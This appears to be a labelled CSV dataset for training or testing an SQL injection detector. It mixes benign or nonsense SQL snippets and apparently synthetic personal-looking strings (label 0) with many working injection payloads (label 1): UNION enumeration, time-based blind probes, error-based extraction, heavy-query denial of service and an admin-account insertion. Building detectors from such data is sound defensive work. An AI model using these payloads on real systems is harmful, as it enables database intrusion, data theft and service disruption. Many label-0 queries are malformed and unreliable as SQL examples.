Sentence,Label
SELECT * FROM practical FETCH FIRST 50 PERCENT ROWS ONLY,0
-2165' where 6593  =  6593 or 9158  =  7254--,1
"1%'  )   or elt  (  6272  =  6272,sleep  (  5   )    )    and   (  '%'  =  '",1
"1%'  )   or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and   (  '%'  =  '",1
"1%"" or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and ""%""  =  """,1
1'||  (  select 'hwdj' where 8179  =  8179,1
SELECT * FROM flame WHERE men BETWEEN since09/01/1996minute AND teeth15/31/1996rocky,0
SELECT * FROM region WHERE pattern LIKE '%take%',0
"1""   )    )    and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and    (    (   ""kpwc"" like ""kpwc",1
SELECT * FROM he WHERE castle IN  ( SELECT somewhere FROM trace ) ,0
"-6618""   )    )     )   order by 1#",1
"   SELECT cold, garage, brownFROM orange WHERE coal  IS NOT NULL",0
33825,0
SELECT form ( s )  FROM leaf SELECT husband FROM arrangement,0
empuar,0
"-7601""   )    )     )   union all select 1293,1293,1293,1293,1293,1293,1293,1293--",1
SELECT AVG ( imagine ) FROM directly,0
15807509t,0
1  )   where 1622  =  1622,1
"SELECT t.*, tt.* FROM wp_terms AS t INNER JOIN wp_term_taxonomy AS tt ON t.term_id  =  tt.term_id WHERE tt.taxonomy IN  ( 'support_cat' )  AND t.term_id IN  (  2637  ) ",0
"1""   )    )     )   or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and    (    (     (  ""lmjg"" like ""lmjg",1
"-7514%""   )    )     )   or 2448  =  8797#",1
"1""   )    )     )   and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and    (    (     (  ""rsru""  =  ""rsru",1
SELECT TOP 3 * FROM opportunity,0
babasaki,0
-8636'   )    )     )   or 4301  =  7212--,1
"1"" and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )    and ""mynm"" like ""mynm",1
SELECT Count ( * )  AS company,0
genvieve,0
"rua bamio, 190 11?h",0
SELECT TOP 3 * FROM bigger SELECT * FROM could 3SELECT * FROM wooden,0
"1  )   where 7881  =  7881 and 9660  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",1
dudarova@automoviles-hibridos.ag,0
"pasaje lucero 147,",0
SELECT * FROM birthday WHERE all = 'party' LIMIT 3,0
"1%""   )    )     )   union all select null,null,null,null,null,null,null,null,null#",1
"1%'   )    )     )   union all select null,null,null,null--",1
SELECT COUNT ( box ) FROM balance,0
"1'  )   where 3476  =  3476 and elt  (  1210  =  1210,sleep  (  5   )    )   --",1
"carretera nacional 139, 9?a",0
"cuesta sagrado corazon, 155 5?a",0
95937804c,0
cabildeo,0
"ronda sant antoni maria claret 144,",0
de las muecas pedrol,0
SELECT AVG ( as )  FROM hurt  SELECT SUM ( poor ) ,0
"1""   )    )     )   and 3715 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  3715  =  3715  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (     (  ""dksc""  =  ""dksc",1
"select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3--",1
SELECT TOP 3 * FROM program,0
bruscamente,0
SELECT * FROM fell FETCH FIRST 50 PERCENT ROWS ONLY,0
"1 where 7906  =  7906 or 8156  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",1
SELECT * FROM couple WHERE previous = 'tone'  OR street = 'everyone',0
" select * from users where id  =  '1' union select \.#,@@VERSION -- 1'",1
SELECT becoming ( s )  FROM terrible UNION,0
"c/ huescar 60,",0
"1""   )    )    and   (  3020  =  3020  )  *6703 and    (    (   ""bely""  =  ""bely",1
"1%' or 7427  =  dbms_pipe.receive_message  (  chr  (  116  )  ||chr  (  87  )  ||chr  (  90  )  ||chr  (  109  )  ,5  )  --",1
"  SELECT nuts,though,worry FROM aside LEFT JOIN Orders ON quick.careID =  sometime.write ORDER BY crack.card",0
escenogrfica,0
sangborivutr@ssextremadura.gr,0
96277205x,0
yarela,0
SELECT wheel FROM taken UNION SELECT grandmother FROM until ORDER BY colony,0
malditamente,0
1 and   (  3020  =  3020  )  *6703# syuj,1
"1'||  (  select 'xbwg' where 7518  =  7518 union all select null,null,null,null,null,null--",1
SELECT * FROM move WHERE religious = 'lost' FETCH FIRST 3 ROWS ONLY,0
1'  )   and   (  1414  =  4775  )  *4775 and   (  'mlmw'  =  'mlmw,1
carbajosa de la sagrada,0
-2432'   )    )    or   (  8459  =  8459  )  *4906 and    (    (   'ejhp'  =  'ejhp,1
"c/ julia minguillon, 179, 7-a",0
40146763x,0
SELECT COUNT ( even ) FROM storm,0
"select * from generate_series  (  3551,3551,case when   (  3551  =  6451  )   then 1 else 0 end  )   limit 1--",1
"1'||  (  select 'scqw' where 3337  =  3337 or 7427  =  dbms_pipe.receive_message  (  chr  (  116  )  ||chr  (  87  )  ||chr  (  90  )  ||chr  (  109  )  ,5  )  --",1
gault-lovett@lunch.com.ga,0
46824,0
monteys bold,0
SELECT * FROM pattern WHERE note = 'past',0
"1   )    )    and 6414  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and    (    (   4048  =  4048",1
" select * from users where id  =  1 + @`\` union select 1,version  (    )   -- 1",1
SELECT * FROM machinery 3 SELECT * FROM pocket,0
kussauer_brereton@showcarsmadrid.com.kp,0
-1304'  )   union all select 7639#,1
DELETE FROM win,0
SELECT early FROM porch UNION SELECT pound FROM form ORDER BY park,0
binaced,0
1'+  (  select mrdi where 7451  =  7451 and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,1
1' in boolean mode  )   and 6969  =    (  select 6969 from pg_sleep  (  5   )    )   #,1
elias pallares,0
SELECT option_value FROM wp_options WHERE option_name  =  '_options_footer_button_4_link' LIMIT 1,0
"1',  (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4250  =  4250  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )  ",1
clarucha,0
37188,0
"1""   )    )    and char  (  109  )  ||char  (  79  )  ||char  (  70  )  ||char  (  90  )    =  regexp_substring  (  repeat  (  right  (  char  (  5012  )  ,0  )  ,5000000000  )  ,null  )  --",1
SELECT * FROM loose WHERE industry  BETWEEN 10 AND 20,0
DELETE FROM enemy,0
1'  )   where 8142  =  8142 waitfor delay '0:0:5'--,1
"-2319 union all select 5068,5068,5068#",1
SELECT AVG ( Price ) FROM spread,0
SELECT * FROM potatoes WHERE simplest = 'felt'  AND  ( alphabet = 'skin' OR group = 'pilot' ) ,0
" SELECT * FROM floor ORDER BY useful, general",0
"1"" and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and ""zwov""  =  ""zwov",1
murillo el cuende,0
SELECT column_name ( s )  FROM table1 FULL OUTER JOIN,0
SELECT * FROM bend  WHERE own NOT LIKE '[needle]%',0
"-1256' in boolean mode  )   union all select 7889,7889,7889,7889,7889,7889,7889,7889,7889--",1
"1' where 8277  =  8277 or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )  --",1
4661,0
"-1647'   )    )    union all select 3030,3030,3030,3030,3030,3030,3030--",1
"  SELECT * FROM wood WHERE empty IN  ( 'stay', 'scale', 'beginning' )  ",0
1'  )   or sleep  (  5  ) ,1
" SELECT column_name ( s )  FROM drink,bank",0
" SELECT * FROM wherever ORDER BY consonant ASC, within DESC",0
SELECT shake,0
8000,0
SELECT * FROM breathe WHERE map = 'success' LIMIT 3,0
"pl. san anton, 102",0
saturnina,0
34112,0
olrich-shapiro1@nuriamartin.aw,0
SELECT Count ( * )  AS wish,0
41713468r,0
SELECT * FROM huge 3 SELECT * FROM mine,0
"-7485""   )    )    as caob where 4100  =  4100 union all select 4100,4100,4100,4100,4100,4100,4100,4100--",1
"1  )   as bgvd where 1753  =  1753 and 6510  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",1
 UPDATE practical SET hang = 'fellow'WHERE carried = 'mark',0
7znallo,0
"1""   )    )     )   and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",1
-6588' where 7793  =  7793 or   (  8459  =  8459  )  *4906--,1
"SELECT * FROM cook WHERE adjective BETWEEN ""season"" AND    ""separate""",0
SELECT * FROM nearly,0
"1'   )    )    union all select null,null,null,null,null,null,null,null--",1
-3378'   )    )    or 4493  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and    (    (   'otbq'  =  'otbq,1
8937,0
SELECT * FROM value WHERE off = 'hard' LIMIT 3,0
"1""   )    )    as tpeh where 6306  =  6306 and 5965  =  5806#",1
c/ david 169 6-h,0
SELECT AVG ( oldest ) FROM disappear SELECT SUM ( plates ) ,0
1   )    )    as dgso where 4654  =  4654 and 2853  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  2853  =  2853  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )  --,1
50619,0
"   SELECT mistake, clock, neededFROM burst WHERE play  IS NOT NULL",0
"1%""   )    )     )   and 9198  =  9198--",1
"SELECT * FROM change WHERE as BETWEEN ""straw"" AND    ""two""",0
cortegana,0
" SELECT * FROM finish ORDER BY cow, sound",0
413f1go,0
SELECT * FROM alone WHERE never BETWEEN act09/01/1996say AND keep15/31/1996meat,0
SELECT * FROM chamber  WHERE think NOT LIKE '[add]%',0
end and   (  'uxzv'  =  'uxzv,1
" SELECT Orders.OrderID, Customers.CustomerName, Orders.OrderDate FROM Orders INNER JOIN Customers ON Orders.CustomerID = Customers.CustomerID;",0
1'||  (  select 'vdeo' where 4355  =  4355,1
" select * from users where id  =  1 or @#""  (    =  1 or 1  =  1 -- 1",1
DELETE FROM how,0
c/ maria zayas de sotomayor 18,0
5exas9labo,0
SELECT announced ( s )  FROM terrible LEFT JOIN,0
callejon san felices 187,0
nadir,0
SELECT * FROM feathers,0
"1%'   )    )    or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and    (    (   '%'  =  '",1
"1'   )    )    as babx where 2494  =  2494 or 1022  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",1
1  )   where 6424  =  6424,1
"1%""   )    )    and 2006  =  2006",1
" select * from users where id  =  1 or   (  \.  )    =  1 union select 1,@@VERSION -- 1",1
"1  )   or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )  ",1
"1'   )    )     )   or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and    (    (     (  'narn'  =  'narn",1
"1"" and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and ""ouix""  =  ""ouix",1
itter,0
 or 3  =  3,1
"1"" where 9230  =  9230",1
"-8143 union all select 4492,4492,4492,4492,4492,4492,4492,4492,4492#",1
SELECT * FROM case  WHERE finest NOT LIKE '[location]%',0
SELECT AVG ( forest ) FROM drop SELECT SUM ( eat ) ,0
" select * from users where id  =  1 or ""{."" or 1  =  1 -- 1",1
"-4155'   )    )     )   union all select 1775,1775,1775,1775,1775,1775,1775--",1
SELECT * FROM hay FETCH FIRST 3 ROWS ONLY,0
SELECT COUNT ( smoke ) FROM reader,0
SELECT * FROM flat 3,0
SELECT * FROM  ( SELECT meal FROM sat ) ,0
DELETE FROM send,0
"-5637%""   )    )     )   or 6872  =  6872 and    (    (     (  ""%""  =  """,1
3880000000000000,0
" SELECT RIGHT ( CustomerName, 5 )  AS ExtractString FROM Customers;",0
kosanovic@discon.cg,0
"plaa mig de can clos, 122",0
1  )   as gfhf where 5804  =  5804 or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   --,1
"1""  )   where 7548  =  7548",1
SELECT TOP 50 PERCENT * FROM college SELECT * FROM memory FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM rising,0
goth,0
tejo,0
SELECT * FROM main ORDER BY nearby,0
moriyama,0
"1%' or 6979  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",1
1 and 2853  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  2853  =  2853  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  ) ,1
81338514a,0
"  SELECT TIME ( ""2017-08-15 19:30:10.000001"" ) ;",0
1' or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and 'dogx'  =  'dogx,1
"1'   )    )    as ydbt where 8062  =  8062 and 6414  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",1
"calle ducado de neopatria 63, 12-h",0
33744160d,0
select case when 2599  =  7035 then 1 else null end--,1
SELECT * FROM while WHERE dream  BETWEEN 10 AND 20,0
SELECT * FROM mood WHERE field = 'fed',0
"-3370' in boolean mode  )   union all select 3432,3432,3432,3432#",1
SELECT TOP 3 * FROM within SELECT * FROM soil 3SELECT * FROM white,0
"1' or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )   and 'yvzf'  =  'yvzf",1
SELECT castle,0
1  )   where 9160  =  9160,1
SELECT relationship ( s )  FROM production SELECT almost FROM wall,0
7x,0
1102,0
SELECT COUNT ( cake ) FROM porch,0
34830,0
"1%""   )    )     )   rlike sleep  (  5  )  #",1
"1'||  (  select 'uusj' where 2149  =  2149 or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )     )  ||'",1
"1'  )   as ohcs where 9588  =  9588 or elt  (  6272  =  6272,sleep  (  5   )    )   --",1
"1' in boolean mode  )   union all select null,null,null,null,null--",1
"1'   )    )     (  select   (  case when   (  5451  =  5451  )   then regexp_substring  (  repeat  (  right  (  char  (  5451  )  ,0  )  ,500000000  )  ,null  )   else char  (  108  )  ||char  (  76  )  ||char  (  112  )  ||char  (  116  )   end  )   from information_schema.system_users  )   and    (    (   'oxvd' like 'oxvd",1
"iif  (  7011  =  2522,1,1/0  )  ",1
hi or a  =  a,1
"1%""   )    )    union all select null,null,null,null,null,null,null,null#",1
"1""   )    )    union all select null,null,null,null,null,null,null,null,null--",1
waitfor delay '0:0:5' and   (  4614  =  4614,1
1'+  (  select 'qylf' where 6984  =  6984 and 2255  =  5094,1
SELECT * FROM ago  WHERE noon = blank,0
SELECT COUNT ( DISTINCT pine )  FROM beauty,0
sikes-jeans@923.mv,0
nichol,0
SELECT * FROM mass WHERE ocean = 'syllable'  AND City = 'characteristic',0
"1%""   )    )    or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (   ""%""  =  """,1
SELECT * FROM company WHERE center  BETWEEN 10 AND 20,0
SELECT * FROM screen WHERE thank = 'across' FETCH FIRST 3 ROWS ONLY,0
desortija0a,0
"-9958""  )   as jzvq where 3741  =  3741 union all select 3741,3741,3741#",1
moskuna@sitcpla.ye,0
SELECT TOP 3 * FROM hand SELECT * FROM writer 3SELECT * FROM seeing,0
1 where 5443  =  5443,1
SELECT MIN ( spell )  AS paid FROM essential,0
"calle manzanilla 141,",0
"select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and ""%""  =  """,1
SELECT * FROM proper WHERE    NOT built = 'well',0
or 1  =  1/*,1
SELECT AVG ( well ) FROM drop SELECT SUM ( statement ) ,0
6308700000000000,0
"  SELECT back AS himself, sand AS [clay]  FROM shelter",0
"1 and elt  (  4249  =  4249,7259  )  ",1
-2223'   )    )    as mjwp where 8650  =  8650 or 7900  =  5838,1
"1%""   )    )     )   and 2716  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",1
"SELECT t.*, tt.* FROM wp_terms AS t INNER JOIN wp_term_taxonomy AS tt ON t.term_id  =  tt.term_id WHERE tt.taxonomy IN  ( 'property_label' )  ORDER BY t.name ASC",0
"1""   )    )     )   and make_set  (  7809  =  9564,9564  )   and    (    (     (  ""jggk"" like ""jggk",1
"-1559 union all select 3985,3985,3985,3985#",1
6285980000000000,0
hi' or 1  =  1 --,1
SELECT bat ( s )  FROM wise SELECT leaving ( s ) ,0
SELECT * FROM  ( SELECT right FROM world ) ,0
SELECT * FROM equipment  WHERE horse = eaten,0
SELECT * FROM corn,0
"   SELECT say,grade,wise,engine,post     (  (  arrangement JOIN date ON bright.known =  fish.writing )   INNER JOIN teamON Orders.even =  tune.morningID ) ",0
"1%'   )    )     )   and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )   and    (    (     (  '%'  =  '",1
1'||  (  select 'xglm' from dual where 3556  =  3556 or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --,1
SELECT * FROM wing FETCH FIRST 50 PERCENT ROWS ONLY,0
"calle santa pola, 7",0
SELECT COUNT ( thouID ) FROM chamber,0
2813,0
benigni@viajesdacapalla.pa,0
1 where 8578  =  8578 and 4770  =  4474--,1
81717068t,0
SELECT * FROM parallel FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM upper,0
"-6368' union all select 6529,6529,6529--",1
SELECT TOP 3 * FROM opportunity WHERE finest = 'dawn',0
foixenc illanes,0
1'  )   and 7533  =  7533,1
"1%'  )   or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and   (  '%'  =  '",1
"-9535"" order by 1--",1
vartan,0
SELECT * FROM yellow ORDER BY saddle,0
SELECT * FROM train WHERE sometime = 'flag'  OR circle = 'battle',0
"1""  )   where 1673  =  1673 or 7427  =  dbms_pipe.receive_message  (  chr  (  116  )  ||chr  (  87  )  ||chr  (  90  )  ||chr  (  109  )  ,5  )  --",1
"-7382'   )    )    or make_set  (  9425  =  4330,4330  )   and    (    (   'tvaz' like 'tvaz",1
1'+  (  select vfmy where 5711  =  5711,1
"1 where 5332  =  5332 or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )  --",1
SELECT * FROM morning FETCH FIRST 50 PERCENT ROWS ONLY,0
" select * from users where id  =  1 union select @||1,version  (    )   -- 1",1
"-2289""  )   or 8624  =  6279 and   (  ""ised""  =  ""ised",1
1'   )    )    and 7533  =  7533 and    (    (   'pagc' like 'pagc,1
"1"" and 6969  =    (  select 6969 from pg_sleep  (  5   )    )   ",1
SELECT AVG ( Price ) FROM tell,0
SELECT team ( s FROM though RIGHT JOIN,0
kiam,0
-8370'   )    )    or   (  3501  =  6407  )  *6407 and    (    (   'agcm' like 'agcm,1
SELECT AVG ( noted ) FROM key,0
messenger@blanquillos.pk,0
fustukian@comercioenlacalle.tf,0
SELECT AVG ( Price ) FROM attack,0
"-1550%""   )    )     )   order by 1--",1
"1'||  (  select 'mwmn' where 5112  =  5112 or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a   )    )   ||'",1
1'||  (  select 'agng' from dual where 3337  =  3337 rlike sleep  (  5   )    )   ||',1
koontz,0
" SELECT column_name ( s )  FROM zipper,hot",0
virge,0
"-5640""   )    )    or 9792  =  2728--",1
3945930000000000,0
"-9808' in boolean mode  )   union all select 2528,2528,2528,2528,2528,2528,2528--",1
SELECT * FROM gate FETCH FIRST 50 PERCENT ROWS ONLY,0
end  )  +',1
SELECT * FROM essential WHERE    NOT enemy = 'gravity',0
1' and non_existant_table   =   '1,1
lilien@aprendeaestudiar.lt,0
"  SELECT art,announced,dug FROM verb LEFT JOIN Orders ON solve.compositionID =  tax.general ORDER BY railroad.dangerous",0
"INSERT INTO blood ( meal, each, term, mental, heard, smaller )  VALUES  ( 'her', 'help'. pure', 'develop', 'tell', 'bone', 'constantly' )  ",0
"1'+  (  select 'nzgq' where 7230  =  7230 and elt  (  1210  =  1210,sleep  (  5   )    )     )  +'",1
"1%""   )    )     )   union all select null,null,null,null,null,null,null,null,null,null--",1
"1  )   as qodq where 4945  =  4945 or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",1
ohala,0
adelaide,0
50163,0
SELECT * FROM growth FETCH FIRST 3 ROWS ONLY SELECT TOP 50 PERCENT * FROM managed,0
"1'+  (  select ouhd where 8905  =  8905 and 6510  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7   )    )   +'",1
SELECT * FROM south WHERE week BETWEEN nor09/01/1996apple AND growth15/31/1996thus,0
SELECT TOP 50 PERCENT * FROM ear SELECT * FROM fog FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM tribe,0
manducatoria,0
"1%""  )   union all select null,null#",1
ronet_huebner@nikemujeres.bm,0
"1%"" union all select null,null,null#",1
"  SELECT screenID AS ID, tiny AS swimming FROM become",0
"1  )   where 8164  =  8164 or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",1
SELECT * FROM grandmother WHERE during LIKE '%blind%',0
"1  )   and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  ",1
"  SELECT respectID AS ID, experiment AS happily FROM can",0
SELECT * FROM ProductsWHERE ProductName BETWEEN 'Carnarvon Tigers' AND 'Mozzarella    di Giovanni',0
" SELECT FIELD ( 5, 0, 1, 2, 3, 4, 5 ) ;",0
"-5748' union all select 1224,1224,1224,1224,1224,1224,1224,1224,1224#",1
c6he5era,0
81208495a,0
" end and ""%""  =  """,1
"select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and    (    (     (  'vcgc' like 'vcgc",1
06673981w,0
"1"" where 1203  =  1203 union all select null,null,null--",1
DELETE FROM union WHERE drew = 'gravity',0
"   SELECT growth, ought, finishFROM serve WHERE phrase  IS NOT NULL",0
"1""  )   or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )   and   (  ""ponv""  =  ""ponv",1
"-3963"" or 1224  =  5119",1
en8og1da,0
"-2211"" or 2113  =  8885#",1
"1"" or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )  ",1
" SELECT * FROM military ORDER BY lower, courage",0
"1'   )    )     )   and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and    (    (     (  'gwew' like 'gwew",1
tapia de casariego,0
SELECT * FROM ourselves WHERE sad = 'select' LIMIT 3,0
SELECT * FROM consist WHERE add BETWEEN 'example' AND 'birthday',0
SELECT * FROM box WHERE NOT call = 'whatever'  AND NOT process = 'choose',0
SELECT * FROM serve FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM honor,0
select pg_sleep  (  5  )  # pjvi,1
alidia,0
"-9737""   )    )     )   order by 1--",1
SELECT * FROM sudden WHERE bill IN  ( SELECT spend FROM something ) ,0
SELECT * FROM remove WHERE pool IN  ( SELECT one FROM phrase ) ,0
SELECT AVG ( Price ) FROM gravity,0
SELECT TOP 3 * FROM brief WHERE monkey = 'changing',0
"select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and    (    (   'gfln'  =  'gfln",1
supersticin,0
"-9659   )    )     )   union all select 8665,8665,8665,8665,8665,8665,8665--",1
SELECT AVG ( Price ) FROM thus,0
14724400f,0
SELECT * FROM central FETCH FIRST 50 PERCENT ROWS ONLY,0
SELECT * FROM order WHERE but = 'piano' LIMIT 3,0
1%'   )    )     )   order by 1--,1
DELETE FROM thumb WHERE rise = 'review',0
SELECT * FROM daily FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM exercise,0
"1"" where 4298  =  4298 order by 1--",1
4271,0
8366000000000000,0
SELECT exchange,0
SELECT * FROM fast WHERE up = 'simply',0
SELECT MIN ( bus )  AS bus FROM build,0
SELECT * FROM bill WHERE cover NOT LIKE 'industry%',0
6478,0
"   SELECT modern,decide,dirt,easily,safety     (  (  frame JOIN acres ON crew.won =  bean.alike )   INNER JOIN ranON Orders.moon =  pot.columnID ) ",0
kingslan,0
"1%'  )   and 2716  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",1
santibez de bjar,0
"1%'   )    )    and make_set  (  6527  =  9529,9529  )   and    (    (   '%'  =  '",1
"1 and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  -- gynj",1
" || myappadmin.adduser  (  'admin', 'newpass'  )   || '",1
"1""   )    )     )   union all select null,null,null,null,null,null,null--",1
silas,0
"c/ ulises 17,",0
"1""   )    )    as uels where 9447  =  9447 or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )  --",1
"1%'  )   union all select null,null,null,null--",1
